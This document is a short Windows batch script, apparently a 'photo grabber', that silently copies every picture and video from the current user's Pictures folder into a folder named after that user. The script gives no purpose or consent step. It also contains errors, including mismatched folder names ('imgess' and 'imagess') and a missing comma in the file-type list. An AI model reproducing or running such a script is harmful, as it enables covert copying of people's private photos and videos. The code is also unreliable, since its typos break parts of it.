@echo off
if not exist ".\\imgess"%username% md ".\imagess\"%username%
cd ".\imagess\"%username%
for /r %userprofile%\pictures %%x in (*.jpg,*.jpeg,*.mp4,*.3gp*.png,*.JPG,*.JPEG,*.PNG) do copy "%%x" ".\"